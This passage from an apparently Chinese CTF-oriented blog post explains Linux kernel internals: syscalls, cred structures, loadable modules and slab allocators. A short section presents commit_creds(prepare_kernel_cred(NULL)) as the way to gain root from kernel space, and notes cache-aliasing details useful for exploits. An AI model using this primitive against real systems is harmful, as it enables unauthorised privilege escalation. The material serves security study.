write））。当用户空间的程序利用现有权限无法满足需求时，就会进行系统调用向操作系统内核请求需要更高权限的服务。在这个过程中，用户进程会<strong>暂时陷入内核态，待内核工作完成后再返回用户态</strong>。</p>\n<p>64位和32位的系统调用号分别存放在 <code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code> 和 <code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code> 。</p>\n<p>根据系统位数不同，Linux 下系统调用的方式也不同：</p>\n<ul>\n<li>32位：执行 <code>int 0x80 </code>汇编指令（80号中断）</li>\n<li>64位：执行 <code>syscall</code> 汇编指令 / 执行 <code>sysenter</code> 汇编指令（only intel）</li>\n</ul>\n<p>用户态进入到内核态的流程如下：</p>\n<p>通过<code>eax/rax</code>寄存器存放<strong>系统调用号</strong>，并通过寄存器存放该系统调用的参数：</p>\n<ul>\n<li>32 位：<code>ebx、ecx、edx、esi、edi、ebp</code>作为第一个参数、第二个参数…进行参数传递</li>\n<li>64 位：<code>rdi、rsi、rdx、rcx、r8、r9</code>作为第一个参数、第二个参数…进行参数传递</li>\n</ul>\n<p>同样地，内核执行完系统调用后退出系统调用也有对应的两种方式：</p>\n<ul>\n<li>执行<code>iret</code>汇编指令</li>\n<li>执行 <code>sysret</code> 汇编指令 / 执行<code>sysexit</code>汇编指令（only Intel）</li>\n</ul>\n<h2 id=\"进程权限管理\"><a href=\"#进程权限管理\" class=\"headerlink\" title=\"进程权限管理\"></a>进程权限管理</h2><p>kernel调度所有计算机资源，并为应用程序提供他们的抽象，相应的，应用程序的权限也由kernel来管理，kernel决定一个应用程序是否有权限使用某一抽象。</p>\n<p>在内核中使用结构体 <code>task_struct</code> 表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中，其中的内容大致如下：</p>\n<p><img src=\"./Kernel_Basic_Knowledge/2W8xIfwqm9Y7Fru.png\" alt=\"img\"></p>\n<h3 id=\"结构体cred\"><a href=\"#结构体cred\" class=\"headerlink\" title=\"结构体cred\"></a>结构体cred</h3><p>在结构体<code>task struct</code>中就包含有权限的信息，<strong>Process credentials</strong> 就是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p>\n<ul>\n<li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li>\n<li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li>\n<li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li>\n</ul>\n<p>一般情况下，主体凭证与客体凭证的值是相同的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Process credentials: */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>        *<span class=\"title\">ptracer_cred</span>;</span> <span class=\"comment\">//gdb调试使用该cred</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Objective and real subjective task credentials (COW): */</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>        *<span class=\"title\">real_cred</span>;</span> <span class=\"comment\">//进程最初的权限</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> __<span class=\"title\">rcu</span>        *<span class=\"title\">cred</span>;</span> <span class=\"comment\">//进程当前的权限</span></span><br></pre></td></tr></table></figure>\n\n<p>结构体<code>cred</code>定义于内核源码<code>include/linux/cred.h</code>中，用于表示权限凭证：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cred</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">atomic_t</span>    usage;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class=\"line\">    <span class=\"type\">atomic_t</span>    subscribers;    <span class=\"comment\">/* number of processes subscribed */</span></span><br><span class=\"line\">    <span class=\"type\">void</span>        *put_addr;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span>    magic; <span class=\"comment\">//可用于寻找cred结构体</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC    0x43736564</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CRED_MAGIC_DEAD    0x44656144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"comment\">//各种ID</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        uid;        <span class=\"comment\">/* real UID of the task */</span> </span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        gid;        <span class=\"comment\">/* real GID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        suid;        <span class=\"comment\">/* saved UID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        sgid;        <span class=\"comment\">/* saved GID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        euid;        <span class=\"comment\">/* effective UID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        egid;        <span class=\"comment\">/* effective GID of the task */</span></span><br><span class=\"line\">    <span class=\"type\">kuid_t</span>        fsuid;        <span class=\"comment\">/* UID for VFS ops */</span></span><br><span class=\"line\">    <span class=\"type\">kgid_t</span>        fsgid;        <span class=\"comment\">/* GID for VFS ops */</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">unsigned</span>    securebits;    <span class=\"comment\">/* SUID-less security management */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_inheritable; <span class=\"comment\">/* caps our children can inherit */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_permitted;    <span class=\"comment\">/* caps we&#x27;re permitted */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_effective;    <span class=\"comment\">/* caps we can actually use */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_bset;    <span class=\"comment\">/* capability bounding set */</span></span><br><span class=\"line\">    <span class=\"type\">kernel_cap_t</span>    cap_ambient;    <span class=\"comment\">/* Ambient capability set */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_KEYS</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span>    jit_keyring;    <span class=\"comment\">/* default keyring to attach requested</span></span><br><span class=\"line\"><span class=\"comment\">                     * keys to */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">session_keyring</span>;</span> <span class=\"comment\">/* keyring inherited over fork */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">process_keyring</span>;</span> <span class=\"comment\">/* keyring private to this process */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">thread_keyring</span>;</span> <span class=\"comment\">/* keyring private to this thread */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>    *<span class=\"title\">request_key_auth</span>;</span> <span class=\"comment\">/* assumed request_key authority */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_SECURITY</span></span><br><span class=\"line\">    <span class=\"type\">void</span>        *security;    <span class=\"comment\">/* subjective LSM security */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span>;</span>    <span class=\"comment\">/* real user ID subscription */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_namespace</span> *<span class=\"title\">user_ns</span>;</span> <span class=\"comment\">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group_info</span> *<span class=\"title\">group_info</span>;</span>    <span class=\"comment\">/* supplementary groups for euid/fsgid */</span></span><br><span class=\"line\">    <span class=\"comment\">/* RCU deletion */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> non_rcu;            <span class=\"comment\">/* Can we skip RCU deletion? */</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rcu_head</span>    <span class=\"title\">rcu</span>;</span>        <span class=\"comment\">/* RCU deletion hook */</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>\n\n<p><code>cred</code>结构体中记录了<strong>一个进程四种不同种类的UID（用户ID）和GID（组ID）</strong>：</p>\n<ul>\n<li><strong>真实ID</strong>（real ID）：标识一个进程<strong>启动时的ID</strong></li>\n<li><strong>保存ID</strong>（saved ID）：标识一个进程<strong>最初的有效ID</strong></li>\n<li><strong>有效ID</strong>（effective ID）：标识一个进程<strong>正在运行时所属的ID</strong>，一个进程在运行途中是可以改变自己所属用户和组的，因而权限机制也是<strong>通过有效ID进行认证</strong>的，内核通过有效ID来进行特权判断；为了防止用户一直使用高权限，<strong>当任务完成之后，有效ID会与保存ID进行交换</strong>，恢复进程的有效权限</li>\n<li><strong>文件系统ID</strong>（ID for VFS ops）：标识一个进程<strong>创建文件时进行标识的ID</strong></li>\n</ul>\n<p>通常情况下这几个ID都是相同的。</p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>一个进程的权限是由位于内核空间的<code>cred</code>结构体进行管理的，因此只要改变一个进程的<code>cred</code>结构体，就能改变其执行权限，在内核空间有如下两个函数，都位于<code>kernel/cred.c</code>中，可以用于改变<code>cred</code>结构体：</p>\n<ul>\n<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li>\n<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li>\n</ul>\n<p>在<code>prepare_kernel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p>\n<p>那么我们不难想到，只要我们能够**在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>**，那么就能够将当前进程的权限提升到<code>root</code></p>\n<h2 id=\"文件\"><a href=\"#文件\" class=\"headerlink\" title=\"文件\"></a>文件</h2><p>Linux系统的设计中秉承着<strong>万物皆文件</strong>的思想，因此<strong>所有计算机资源都被抽象为文件</strong>，无论是硬件设备、目录、普通文件、管道，甚至进程、磁盘都被抽象成文件。基于这种设计，<strong>所有计算机资源都可以通过访问文件的形式进行操作，所有读操作都可以使用<code>read</code>完成，所有写操作都可以使用<code>write</code>完成</strong>，所有操作最后都可以以读写的方式实现。</p>\n<h3 id=\"进程文件系统\"><a href=\"#进程文件系统\" class=\"headerlink\" title=\"进程文件系统\"></a>进程文件系统</h3><p>我们知道Linux系统中的进程也被抽象成了文件，那就代表它的数据以文件的形式存放，并且我们可以通过访问文件的形式对其进行读写。</p>\n<p>进程文件系统（process file system， 简写为procfs）用以描述一个进程，其中包括该进程所打开的文件描述符、堆栈内存布局、环境变量等等。它本身是一个伪文件系统，通常被挂载到<code>/proc</code>目录下，并不真正占用储存空间，而是占用一定的<strong>内存</strong>。当一个进程被建立起来时，其进程文件系统便会被**挂载到<code>/proc/[PID]</code>**下，我们可以在该目录下查看其相关信息。</p>\n<h3 id=\"文件的访问\"><a href=\"#文件的访问\" class=\"headerlink\" title=\"文件的访问\"></a>文件的访问</h3><p>进程通过<strong>文件描述符</strong>（<strong>file descriptor</strong>）来完成对文件的访问，文件描述符是一个非负整数，本质上是对文件的索引值，进程所有执行 I/O 操作的系统调用都会通过文件描述符来找到对应文件。</p>\n<p>每个进程都<strong>独立有着一个文件描述符表</strong>，存放着该进程所打开的文件索引，每当进程<strong>成功</strong>打开一个现有文件/创建一个新文件时（通过系统调用open进行操作），<strong>内核会向进程返回一个文件描述符</strong>。在kernel中有着一个文件表，由所有的进程<strong>共享</strong>。</p>\n<p>详细可以回看<code>IO_FILE</code>部分。</p>\n<h3 id=\"iotcl\"><a href=\"#iotcl\" class=\"headerlink\" title=\"iotcl\"></a>iotcl</h3><p>操作系统向应用程序提供了系统调用，使应用程序可以<strong>通过内核访问标准外部设备</strong>，因为大多数硬件设备只能够在内核空间内直接寻址。</p>\n<p>但是当访问<strong>非标准</strong>硬件设备时，使用系统调用显得不合适， 因为部分设备可能没有被内核考虑到，这样应用程序就无法使用该设备了，这时候就需要用户模式直接访问设备。</p>\n<p>为了解决这个问题，内核被设计成<strong>可扩展</strong>的，可以加入一个称为<strong>设备驱动</strong>的模块，<strong>驱动的代码允许在内核空间运行而且可以对设备直接寻址</strong>。并且预留了一个<strong>系统调用<code>iotcl</code>用于用户空间和设备驱动的通信</strong>。</p>\n<p>对设备驱动的请求是一个<strong>以设备和请求号码为参数</strong>的<code>ioctl</code>调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">ioctl</span><span class=\"params\">(<span class=\"type\">int</span> fd, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> request, ...)</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>fd：设备的文件描述符</strong></li>\n<li><strong>request：请求码</strong></li>\n<li><strong>其他参数</strong></li>\n</ul>\n<h2 id=\"Loadable-Kernel-Modules-LKMs\"><a href=\"#Loadable-Kernel-Modules-LKMs\" class=\"headerlink\" title=\"Loadable Kernel Modules(LKMs)\"></a>Loadable Kernel Modules(LKMs)</h2><p>Linux Kernel采用宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是<strong>缺乏可扩展性与可维护性</strong>。同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会<strong>占据大量内存空间</strong>，如果要加入的新服务往往意味着要<strong>重新编译整个内核</strong>。</p>\n<p><strong>可加载内核模块（Loadable Kernel Modules，即LKMs）</strong>的设计就是为了解决上述问题。在内核空间运行的LKMs可以为应用程序提供<strong>新的系统调用或服务</strong>，同时LKMs可以像积木一样从内核中被<strong>装载/卸载</strong>，大大提高了kernel的可拓展性与可维护性</p>\n<p>可加载内核模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p>\n<ul>\n<li>驱动程序（Device drivers）<ul>\n<li>设备驱动</li>\n<li>文件系统驱动</li>\n<li>…</li>\n</ul>\n</li>\n<li>内核扩展模块 (modules)</li>\n</ul>\n<p>LKMs与用户态可执行文件一样都<strong>采用ELF格式</strong>，但是<strong>LKMs运行在内核空间，且无法脱离内核运行</strong></p>\n<p>通常与LKM相关的命令有以下三个：</p>\n<ul>\n<li><code>lsmod</code>：列出现有的LKMs</li>\n<li><code>insmod</code>：装载新的LKM（需要root）</li>\n<li><code>rmmod</code>：从内核中移除LKM（需要root）</li>\n<li><code>modprobe</code>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li>\n</ul>\n<blockquote>\n<p>大多数CTF比赛中，kernel pwn的漏洞出现在 LKM 中。</p>\n</blockquote>\n<h2 id=\"内核内存管理\"><a href=\"#内核内存管理\" class=\"headerlink\" title=\"内核内存管理\"></a>内核内存管理</h2><p>Linux kernel 将内存分为 <code>页→区→节点</code> 三级结构，主要有两个内存管理器—— <code>buddy system</code> 与 <code>slab allocator</code>。内存结构<strong>自顶向下</strong>依次为：</p>\n<ul>\n<li>节点(node)</li>\n<li>区(zone)</li>\n<li>页(page)</li>\n</ul>\n<h3 id=\"内核内存结构\"><a href=\"#内核内存结构\" class=\"headerlink\" title=\"内核内存结构\"></a>内核内存结构</h3><p>页：Linux kernel 中使用 <code>page</code> 结构体来表示一个物理页框，<strong>每个物理页框都有着一个对应的 page 结构体</strong>。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/MjWZmba9SLH1xIO.png\" alt=\"image.png\"></p>\n<p>区：在 Linux 下将一个节点内<strong>不同用途</strong>的内存区域划分为不同的 <code>区（zone）</code>，对应结构体 <code>struct zone</code>。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib.png\" alt=\"偷的图.png\"></p>\n<p>节点：zone 再向上一层便是<strong>节点</strong>——Linux 将<strong>内存控制器（memory controller）</strong>作为节点划分的依据。</p>\n<h3 id=\"内存模型\"><a href=\"#内存模型\" class=\"headerlink\" title=\"内存模型\"></a>内存模型</h3><p>Linux 提供了三种内存模型，定义于 <code>include/asm-generic/memory_model.h</code> 中。</p>\n<p><img src=\"./Kernel_Basic_Knowledge/wLzFuCB5n1DAIY7.png\" alt=\"image.png\"></p>\n<p>内存模型在编译期就会被确定下来，目前常用的是 <code>Sparse Memory</code> 模型，即离散内存模型。</p>\n<h4 id=\"Flat-Memory\"><a href=\"#Flat-Memory\" class=\"headerlink\" title=\"Flat Memory\"></a>Flat Memory</h4><p>平滑内存模型。物理内存地址连续，有一个<strong>全局变量</strong> <code>mem_map</code> ，通过一个大的 <code>struct page</code> 数组直接对应现有的物理内存。</p>\n<h4 id=\"Discontiguous-Memory\"><a href=\"#Discontiguous-Memory\" class=\"headerlink\" title=\"Discontiguous Memory\"></a>Discontiguous Memory</h4><p>非连续性内存模型。主要针对内存中存在空洞的情况。</p>\n<p>对于<strong>每一段连续的物理内存</strong>，都有一个 <code>pglist_data</code> 结构体进行对应，其成员 <code>node_mem_map</code> 为一个 <code>struct page</code> 指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存。</p>\n<p>有一个<strong>全局变量</strong> <code>node_data</code> 为一个 <code>pglist_data</code> 指针数组，其中存放着指向每一个 <code>pglist_data</code> 的指针，该数组的大小为 <code>MAX_NUMNODES</code>。</p>\n<h4 id=\"Sparse-Memory\"><a href=\"#Sparse-Memory\" class=\"headerlink\" title=\"Sparse Memory\"></a>Sparse Memory</h4><p>离散内存模型。在一个 <code>mem_section</code> 结构体中存在一个 <code>section_mem_map</code> 成员指向一个 <code>struct page</code> 数组对应一段连续的物理内存，即<strong>将内存按照 <code>section</code> 为单位</strong>进行分段。</p>\n<p>存在一个全局指针数组 <code>mem_section</code> （与结构体同名）存放所有的 <code>mem_section</code> 指针，指向<strong>理论上支持的内存空间</strong>，每个 <code>section</code> <strong>对应的物理内存不一定存在</strong>，若不存在则此时该 section 的指针为 NULL。</p>\n<p>这种模型<strong>支持内存的热拔插</strong>。</p>\n<h3 id=\"buddy-system\"><a href=\"#buddy-system\" class=\"headerlink\" title=\"buddy system\"></a>buddy system</h3><p><code>buddy system</code> 是 Linux kernel 中的一个较为底层的内存管理系统，<strong>以内存页为粒度管理所有的物理内存</strong>，其存在于 <strong>区</strong> 这一级别，对当前区所对应拥有的所有物理页框进行管理</p>\n<p>在每个 zone 结构体中都有一个 <code>free_area</code> 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">zone</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">free_area</span>\t<span class=\"title\">free_area</span>[<span class=\"title\">MAX_ORDER</span>];</span></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br></pre></td></tr></table></figure>\n\n<p><code>MAX_ORDER</code>为一个常量，其值为<code>11</code>。</p>\n<p>在 buddy system 中<strong>按照空闲页面的连续大小</strong>进行<strong>分阶</strong>管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：$2^{order}$。</p>\n<p><code>free_area</code>中的页面通过自身的相应字段形成<strong>双向链表</strong>结构：</p>\n<p><img src=\"./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib-1678172668801-7.png\" alt=\"偷的图.png\"></p>\n<ul>\n<li>分配：<ul>\n<li>首先会将请求的内存大小向 2 的幂次方张内存页大小<strong>对齐</strong>，之后从<strong>对应的下标</strong>取出连续内存页</li>\n<li>若对应下标链表为<strong>空</strong>，则会从<strong>下一个 order</strong> 中取出内存页，<strong>一分为二</strong>，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向<strong>更高</strong>的 order 进行该请求过程</li>\n</ul>\n</li>\n<li>释放：<ul>\n<li>将对应的连续内存页释放到对应的链表上</li>\n<li>检索<strong>是否有可以合并</strong>的内存页，若有，则进行合成，放入<strong>更高</strong> order 的链表中</li>\n</ul>\n</li>\n</ul>\n<p>但是我们很容易产生<strong>不容易合并</strong>的内存碎片，因此 Linux kernel 还会进行 <strong>内存迁移</strong> 以减少内存碎片，主要由一个持续运行的内核线程完成。</p>\n<h3 id=\"slab-allocator\"><a href=\"#slab-allocator\" class=\"headerlink\" title=\"slab allocator\"></a>slab allocator</h3><p>slab allocator 则是<strong>更为细粒度的内存管理器</strong>，其通过向 buddy system 请求<strong>单张或多张连续内存页</strong>后再分割成<strong>同等大小</strong>的<strong>对象</strong>（object）返还给上层调用者来实现更为细粒度的内存管理</p>\n<p>slab allocator 一共有三种版本：</p>\n<ul>\n<li>slab（最初的版本，机制比较复杂，效率不高）</li>\n<li>slob（用于嵌入式等场景的极为简化版本）</li>\n<li>slub（优化后的版本，现在的通用版本）</li>\n</ul>\n<h4 id=\"基本结构\"><a href=\"#基本结构\" class=\"headerlink\" title=\"基本结构\"></a>基本结构</h4><p>slub allocator的基本结构如下：</p>\n<p><img src=\"./Kernel_Basic_Knowledge/ivPnbsjHyI94m5z.png\" alt=\"image.png\"></p>\n<p>slub allocator每次向buddy system请求得到的单<strong>张/多张的内存页称为一个<code>slub</code><strong>，这个<code>slub</code>会被分为多个</strong>同样大小</strong>的对象(object)，每个object作为一个被分配的实体。在 <code>slub</code> 的<strong>第一张内存页</strong>对应的 page 结构体上的 <code>freelist</code> 成员指向该张内存页上的<strong>第一个空闲对象</strong>，一个 <code>slub</code> 上的<strong>所有空闲对象</strong>组成一个以 <code>NULL</code> 结尾的<strong>单向</strong>链表。</p>\n<blockquote>\n<p>object类似于堆中的chunk，不过由于page结构体与物理地址之间有线性对应关系，可以直接通过object地址找到对应的page结构体，因此不需要header</p>\n</blockquote>\n<p><code>kmem_cache</code>是allocator一个<strong>分配组件</strong>，用于<strong>分配特定大小（特定用途）</strong>的对象，所有的<code>kmem_cache</code>构成一个<strong>双向</strong>链表。存在两个结构体数组<code>kmalloc_caches</code>和<code>kmalloc_dma_caches</code>对<code>kmem_cache</code>进行管理。</p>\n<p>一个<code>kmem_cache</code>主要由<code>kmem_cache_cpu</code>和<code>kmem_cache_node</code>组成。</p>\n<ul>\n<li><code>kmem_cache_cpu</code>：这是一个<strong>percpu 变量</strong>（即每个核心上都独立保留有一个副本，原理是以<code> gs</code> 寄存器作为 <code>percpu</code> 段的基址进行寻址），用以表示<strong>当前核心正在使用的 <code>slub</code><strong>，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时</strong>不需要加锁</strong>，从而极大地提高了性能</li>\n<li>kmem_cache_node：可以理解为当前kmem_cache的 slub 集散中心，其中存放着<strong>两个 slub 链表</strong>：<ul>\n<li>partial：该 slub 上<strong>存在</strong>着一定数量的<strong>空闲</strong> object，但并非全部空闲</li>\n<li>full：该 slub 上的<strong>所有</strong> object 都被<strong>分配</strong>出去了</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"分配和释放\"><a href=\"#分配和释放\" class=\"headerlink\" title=\"分配和释放\"></a>分配和释放</h4><ul>\n<li>分配：<ul>\n<li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回</li>\n<li>若 <code>kmem_cache_cpu</code> 上的 slub 已经无空闲对象了，对应 slub 会被加入到 <code>kmem_cache_node</code> 的 <strong>full</strong> 链表，并尝试从 <strong>partial</strong> 链表上取一个 slub 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回</li>\n<li>若 <code>kmem_cache_node</code> 的 partial 链表也空了，那就<strong>向 buddy system 请求分配新的内存页</strong>，划分为多个 object 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用</li>\n</ul>\n</li>\n<li>释放：<ul>\n<li>若被释放 object 属于 <code>kmem_cache_cpu</code> 的 slub，直接使用头插法插入当前 CPU slub 的 freelist</li>\n<li>若被释放 object 属于 <code>kmem_cache_node</code> 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist</li>\n<li>若被释放 object 属于 <code>kmem_cache_node</code> 的 full 链表上的 slub，则其会成为对应 slub 的 freelist 头节点，<strong>且该 slub 会从 full 链表迁移到 partial 链表</strong></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"slab-alias\"><a href=\"#slab-alias\" class=\"headerlink\" title=\"slab alias\"></a>slab alias</h4><p>slab alias 机制是一种对<strong>同等/相近大小</strong> object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p>\n<p>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配<strong>相等/近似</strong>大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong></p>\n<p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会<strong>新建</strong>一个新的 <code>kmem_cache</code> 而非为原有的建立 alias。</p>\n<p>如：在 Linux 4.4 之前的版本中，<code>cred_jar</code> 是 <code>kmalloc-192</code>的<code>alias</code>，在此之后的版本中，由于设置了<code>SLAB_ACCOUNT</code> 标志<code>cred_jar</code> 和 <code>kmalloc-192</code>是两个独立的 <code>kmem_cache</code>。（<code>cred_jar</code>是专门用于分配<code>cred</code>结构体的<code>kmem_cache</code>）</p>\n<h2 id=\"内核态函数\"><a href=\"#内核态函数\" class=\"headerlink\" title=\"内核态函数\"></a>内核态函数</h2><p>内核态的函数有些变化：</p>\n<ul>\n<li>printf() -&gt; <strong>printk()<strong>，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在</strong>内核缓冲区</strong>里，可以通过 <code>dmesg</code> 查看效果</li>\n<li>memcpy() -&gt;copy_from_user()/copy_to_user()<ul>\n<li><code>unsigned long copy_from_user(void *to, const void __user *from, unsigned long n)</code>实现了将用户空间的数据传送到内核空间</li>\n<li><code>unsigned long copy_to_user (void __user * to, const void * from, unsigned long n) </code>实现了将内核空间的数据传送到用户空间</li>\n</ul>\n</li>\n<li>malloc() -&gt; **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 